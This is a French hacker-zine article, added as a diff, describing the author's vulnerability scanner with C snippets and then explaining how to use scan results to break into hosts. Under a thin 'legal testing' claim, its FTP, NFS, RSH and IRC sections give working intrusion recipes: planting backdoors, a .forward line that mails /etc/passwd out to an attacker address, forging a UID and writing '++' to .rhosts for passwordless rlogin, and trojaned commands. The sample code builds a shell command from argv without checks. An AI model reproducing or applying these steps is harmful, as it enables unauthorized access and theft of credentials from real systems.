@@ -1,0 +1,332 @@
+                          ________________________________
+                         | Scan Vulnerabilitées By Lionel |
+                         |________________________________|
+
+
+
+I)-Intro
+--------
+
+J'ecris ce texte pour que vous puissiez mieux comprendre se que fais le scan
+que j'ai codé et une autre possibilitée est que vous vous en codiez un vous
+aussi ou "add" d'autres vulnerabilitées...
+Je n'ais pas codée ce tools pour tous les chtits Warlords et autres tappettes
+dans le style...
+Il est fait pour verifier sa securitée ou pour des testes de securités "legal".
+J'ai voulu faire une nouvelle generation de scan vuln, une qui se contente pas
+de regardé la version du deamon , mais qui vas directement tester des
+commandes qui pourraient etre atteint d'un buffer overflows, se qui fait que
+tu peut tres bien grace a ce code decouvrire de nouveaux buffers overflows que
+personne connait ou bien trouvé des buffers overflows deja "identifiés".
+En tous cas moi j'ai trouvé pas mal de buffer overflows qui sont pas sur
+bugtraq ;) !!(voir ADVISORY OrganiKs ... )
+
+II)-code
+--------
+Il doit etre dans /organiks2/prog/scan.tar.gz ...
+La version du Scan donnée ici est la ver1.0 , la premiere que j'ai codé,
+c'est pour ca que le code est pas nikel , j'ai fini la ver2.0 mais pour le
+moemnt est reste privée pour verifier son efficasitée, qui pour le moment me
+pareit exelente :o) ! Dans la ver2.0 j'ai amelioré le code , j'ai add de
+nouvelle vuln, avec des recherches de buffer overflows sur commande bien plus
+efficasse!Bref a voir dans le n°3 :)
+
+III)-Comment il marche?
+-----------------------
+
+J'ai fais le scan sur un concepte majeur qui est de faire le plus simple
+possible pour s'y retrouver facilement avec des instructions simples.
+(on me dit toujours que mes codes sont trop mal codés et qui sont codé a la
+chelou , enfin ...J'espere que vous comprendré quand meme!).
+Voila la base du code (c'est sur cela que repose pratiquement tous mon scan):
+
+**1-Ceci ouvre une connection (syntaxe:connect_tcp(host,port);)
+
+/* connection tcp usage: host port */
+
+int connect_tcp(struct in_addr addr,unsigned short port)
+{
+struct sockaddr_in serv;
+int thesock,flags;
+
+thesock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+bzero(&serv,sizeof(serv));
+memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
+serv.sin_port=htons(port);
+serv.sin_family=AF_INET;
+if (connect(thesock,(struct sockaddr *)&serv,sizeof(serv)) < 0)
+  return(-1);
+else
+  return(thesock);
+}
+
+**2-Pour ecrire dans la connection ouverte grace à "connect_tcp"
+(syntaxe: fdprintf(connect_tcp,"message\n");
+
+/* ecrit dans une connection */
+
+int fdprintf(int dafd,char *fmt,...)
+{
+char mybuffer[4096];
+va_list va;
+
+va_start(va,fmt);
+vsnprintf(mybuffer,4096,fmt,va);
+write(dafd,mybuffer,strlen(mybuffer));
+va_end(va);
+return(1);
+}
+
+**3-Pour un appel d'une commande
+
+char exem[1024]; /* on donne une valeur de buffer a "exem" qui est de "1024"
+*/ 
+strcpy(exem, "commande argument"); /* on inscrit "commande argument" dans
+"exem" */
+strcat(exem,"argument2"); /* on ajoute "argument2" a la suite de "cmd arg1"
+dans "exem" */
+system(exem); /* execute "exem" qui contient "commande argument
+argument2" */ 
+
+Sinon un exemple plus "visible"("xterm -display ip:0"  sachant que l'ip sera
+defini par argv[1] ):
+char exem[512];
+strcpy(exem, "xterm -display ");
+strcat(exem,argv[1]);
+strcat(exem,":0");
+system(exem);
+
+Si vous etes **** alors il vous reste une solution: "man strcpy;man strcat;man
+system" ;)
+PS: pour pas utilisier 300000 de buffer faite bzero(exem,sizeof(exem)); ce qui
+remet le buffer à zero !(je sais que dans la ver1.0 y en a plein ca ete
+corrigé dans la ver 2.0!)
+**4-La reconnaissance de version de service:
+-1ere partie:
+struct n0m {
+  char *name;
+};
+struct n0m n0m[]={
+			{"version"}, 
+			{"version2"}, 
+			{"version3"}, /* ... */
+			{NULL}
+                     };
+2eme partie:
+char buffer[1024];
+int n=0;
+n=read(sockfd,recvbuf,1024); /* fonction read comme ce que ca veus dire il lit
+donc read(connect_tcp,buffer,sizeof(buffer)) */
+
+if (n <= 0) { /* si n est = ou inferieur à 0 connection a ete fermé ou alors
+il n'y a meme pas eu de connection? */
+fprintf(stderr,"Connection fermé sur imapd\n"); 
+}
+for (i=0;;i++)
+{
+  if (types[i].name==NULL) 
+  {
+    i=0;
+    break;
+  }
+  if (strstr(recvbuf,types[i].name)) /* il regarde si dans le buffer y a une
+chaine de caractere qui ressemble a une de nos version .. */     
+break;
+}
+if (i == 0) { /* i == 0 alors ca veus dire qu'il a pas trouvé de version dans
+buffer */
+printf("version non trouvé dans buffer \n");
+}
+if (i == 1) { /* i == a version */
+printf("version trouvé sur host port\n");
+} 
+if (i == 2) { /* i == a version 2 */
+printf("version2 trouvé sur host port\n");
+} 
+if (i == 3} { /* i == a version 3 */
+printf("version3 trouvé sur host port\n");
+} 
+ 
+Sinon pour savoir si un buffer overflow a marché suffie de demandé si la
+connection est fermé ou encore ouverte...(j'espere que tu es pas idiot)!
+Vous pourrez peut etre ameliorer le code aussi car quand je demande si
+connection < 0 (si ca repond -1 ben c'est que le port est pas ouvert) donc
+au lieu de refaire connection > 0 (1 si le port est ouvert[binaire du con]).
+/* 
+C'est un peut plus compliqué que ca mais deja c'est la base:
+1=oui
+-1=non 
+*/
+Tu fais if connection < 0 {exit} else {[ici connection good]instruction)}.
+Je sais je l'ais pas fait mais je compte le faire car ca feras moins de code..
+
+J'espere que vous aurrez pigé car c'est tous bete mais j'explique tres mal.
+(meme mon prof d'electronique ne comprend pas ce que je fais j'embroulle tjrs
+mais les resultat sont bon ces ce qui compte!!Moi je trouve que je fais
+le plus simple du monde mais on ma dit que c'est le contraire...) 
+Bon je pensse que j'ai rien oublié pour les bases vous possédez tous pour
+faire votre propre scan vuln maintenent!!!!
+
+IV)-Recherche de troue par le scan
+----------------------------------
+
+J'ai voulu developer l'idée d'un scan vuln qui ne sert pas qu'a chercher des
+bugs deja connu de tous, j'ai voulu alterné la possibiliter de verifier la
+version (si elle est connu pour etre buggé) et de tester directement les
+commandes dites semsible (en particulié pour les buffer overflows).
+Biensur je n'ais surement pas exploré tous se qui pourrais etre semsible...
+De toute facon il n'y a pas que les buffer overflows qui faudrais exploiter
+dans ce genre de scan , j'espere pourvoir ameliorer se scan en ajoutant
+d'autre teste de secu plus poussé...
+
+V)-Comment employer les resultats donnés par le scan
+----------------------------------------------------
+
+Je vais essayé de vous expliquez comment utiliser les informations donné par
+le scanneur dans un but de teste d'intrusion "legal" (no piratage here)!
+Deja je vais commencer sur un truc simple pour tous se qui est teste de buffer
+overflows si ils sont concluants alors il vous suffie de regarder la version
+du service vulnerable , verifier qu'un exploit na pas deja ete ecrie et si ca
+n'est pas le cas alors a vous de jouez et de coder votre exploit et si vous
+etes malin vous pourriez coder un patch (temps cas faire)!Biensur serais la
+bienvenue aussi un ptit post dans bugtraq(ou autre) pour montrer que vous etes
+pas un chien et que vous pouvez faire partager votre connaissance pour un monde
+meilleur(Puta** de me*d*)!
+Apres sinon pour utiliser les autre informations(dans l'ordre de scannage):
+
+-FTP -> Bon je vais pas vous parlez des /etc/passwd ou core a exploiter car
+j'espere que vous connaissez...Mais d'une autre chose, imaginons qui a un
+moyen d'ecrire dans un rep (type "incoming" pour pas le nomer), alors on peut
+essayé de foutre un backdoor compilé ou non compilé avec un nom alechant pour
+les utilisateurs ou le root lui meme (la ou peut servire de connaitre le
+courié de ta victime!), si il est assez bete pour l'executer ta gagné!
+Sinon si on peut ecrire dans le rep .Si on arrive a degoté un access L:ftp
+P:toi_qui_ vois alors on peut se connecter et envoier un .forward 
+"echo "|/bin/mail ton@email.fr < /etc/passwd" >> .forward  " qui te renvera le
+fichier passwd  des que tu vas lui ecrire une email a ftp@ip ...
+
+-SENDMAIL -> si expn repond c'est good car grace a c'est information qui donne
+ou vas etre renvoié les emails que cette cherche personne va recevoir
+(j'espere que vous avez compris en quoi cela pourrais aider un hackeur à vous
+pirater...).Pour les qi trop bas j'explique un peu , si vous savez ou va etre
+redirigé le courier d'une personne et que cette adresse ou il va etre redirigé
+a un bas niveau de secu ou si il y a moyen la bas d'avoir plus facilement
+access a son courriez alors peut etre en lisant son couriez vous pourrez
+apprendre des choses interessante pour votre but que je vous rappelle est un
+teste d'intrusion "legal"!(j'espere que je me suis pas trop embroullé la...)
+
+-TELNET -> Pour avoir des infos du systeme "cible" qui seront de tres grand
+utilitées ...(sorry je sais que la version du systeme est defectuseuse nous
+allons dire..., mais si vous voyez que c'est ouvert ben telnet ip ALORS ME
+FAIT PAS CHIER! ;) ...) 
+
+-RSH -> Si ce service est ouvert alors il peut peut-etre nous aider car si il
+y a un "++" dans rhost d'un user ou du root => access sans passwd!!Il y a
+aussi autre chose c'est une identification via host donc si ta la bonne host
+tu passe (pigé? grrrrrrrr => sp00f ...)
+
+-Xwin -> je vais souler les mecs qui connaisse deja tous ces pbs mais bon ...
+Pour savoir comment exploiter se troue possible lire xhost.txt dans organiks2
+ou alors pour les tachons j'explique un peut vous allez me dire que dans ce
+texte on explique comment avoir un mec sur irc grace a son xwin mais tu peut
+aussi via un site suffie de trouver un user un peu bete et de faire un peu de
+SE... (tu me suis je vais pas quand meme te faire un dessin!)
+
+-FINGER -> Tres utilie pour avoir des infos sur le root ou un user
+possiblement utilisable pour notre entrée fracasante ;)
+
+-NFS -> Bon pour se qui serais pas au courant grace a NFS il y a
+defois possibilitée de toucher a des fichiers partagé ...
+Bon j'explique un peu malgré que ca sois tres connu:
+showmount -e ip -> grace a ca ta tous les fichiers partagé avec les access
+demandé pour y touché!
+Donc si il y a des fichiers qui peuve etre touché par "(everyone)"
+On mount: mount victim.com:/file/ /
+On voit que apres y a access a un rep de l'utilisateur -> "toto"
+1 drwx--x--x  8 1055  daemon       1024 AAA  17 00:00 toto
+On vois ca alors on add un user toto dans notre passwd :
+echo toto::1055:1:AAAAA:/: >> /etc/passwd
+apres un chtit su toto (la on est encore en mount...)
+Et la on foue un "++" dans le rhost 
+echo "++" >> toto/.rhosts
+Voila now:
+rlogin ip -l toto
+(c'est pas ca? ;)
+Tu trouve ca dur? Ben ta tord :)
+Apres une autre solution si il n'y a pas d'user mais si disons qu'il exporte
+des commandes ou un truc dans le style , tu peus faire un trojan , pour pas
+que ca sois flague vaus mieux faire un trojan "malin" qui vas executer la cmd
+d'origine et en + notre commande rajoutée!(j'espere que ta pigé?).Ou alors y a
+un truc trop bete a faire qui peut marcher si tu tombe sur un abruti tu laisse
+un backdoor compilé avec un nom qui plait donc si y en a un qui l'execute pour
+voir ,"tu le ...,il la dans l'os quoi" ;) 
+
+-IRC -> il a un ftp genial! A quoi ca peut bien servire?Peut etre a t'il un
+serveur bug ou peut etre peut on avoir un access IRCOP facilement? Ou peut
+etre a t'il mis un eggdrop et si tu arrive a avoir un access assez au tu peus
+envoier une commande (style /do exec cmd je suis pas sur de la commande ;)).
+Ou alors si ca se trouve il y aurras un user aurras le SUPER BITCHX ou un
+autre client qui quand il est mal config accepte automatiquement les dcc (mais
+a quoi ca peut servire?) imagine => /dcc send victime ~/.rhost /* qui contient
+"++" */ et voila le fait pas quand il est devant son irc quand meme!
+
+-CGI -> je te fais pas un dessin ...
+
+-host -l -v -t any,dig,traceroute -> ca peut etre des bonnes infos pour des
+attaques via spoofing ou pour rechercher un cible avec un plus bas niveau de
+secu pour apres revenir sur lui par un reseaux local...
+
+-TCP SEQ -> c'est pour des attack via hijack ....
+
+-NFS -> Si nfs est ouvert il exsite un buffer overflow connu et qui a mon avie
+marche sur toute les versions , je voudrais l'add dans mon scan mais le pb
+c'est pour savoir quelle directory mount puis comment savoir si ca peté!Mais
+je vais trouver!!!!Bon pour en revenir au bug , il suffit de faire une long
+directory AxX/AxX x X -> puis quand tu veus la rm -rf A[tab] ca produit le
+buffer overflows.Biensur ce bug a ete patch mais je suis sur que y a pas que
+rm -rf qui produit cela suffit de chercher et je suis sur que tu troue... :)
+/*
+A=A
+X=nombre non connu
+x=multiplier
+/=barre (ex: /home/lionel/)
+*/
+
+-MOUNTD -> le bug de mountd est en faite quand tu mount si tu mais une
+directory trop grand , tu produit un buffer overflows dans les logs...
+J'ai regardé les codes sources de mountd sur la rh6.1 et apparament y a plus
+moyen de faire un truc comme ca :(
+
+-AMD -> le buffer overflow de AMD est la demande d'une trop grosse map je
+crois que un patch exsite mais pour le moment toutes les version jusqu'a la
+6.1 sont vuln :) !!!
+
+-... prochaine version du texte pour la ver2.0 qui a bcps plus de "moyen"!
+
+Je pensse que j'ai rien oublié....
+Good test of intrusion!
+PS:Pour nis y a des tools interessant que j'aurrais voulu ajouté au scan mais
+j'ai un pb de compilation, les codes s'appelles: ypsnarf.c ,ypbreak.c ...
+
+PS: j'ai amelioré le code donc regardé..
+VI)-Conclusion
+--------------
+Toutes informations peuvent servir c'est a cause de negligence si petite sois
+t'elle qu'y a pratiquement toujours un moyen d'arriver a son but!(ta pas pigé
+se que j'ai dis , ben moi j'ais pas tous compris aussi ;)
+PS: avec la ver2.0 j'ai scanné plusieur site et 2/3 sont vulnerables a une
+attack ...
+
+VII-)Greetz
+-----------
+
+To: clemm, spoty , ank , tiffa, shado, klog, XSFX, Datahck, OrganiKs,[fred],
+Mayhem, rix, exile , chx , prfalken , togusa , einstein , #toulouse, #r9,
+#rhino9,madchat(#madchat->undernet),Darkbug,#linux-fr(ircnet),#oracle(efnet),
+torcy&marcx dormoy&18eme (Ali k.,Xav,Olivier,Mathieux,Mémet,Arnauld,Camel,...),
+cantepeau(sophie,ced,youness,seb,la shente,bouboule,ouadgerie, ...),
+ toulouse(Gui.,florian,Lionel,JM,Dav,Vincent,Bruno,yohan,seb,cyril,
+damien,jenny&virginie,stef&julie...).......Et tous ce que j'oublie...
+
+
+
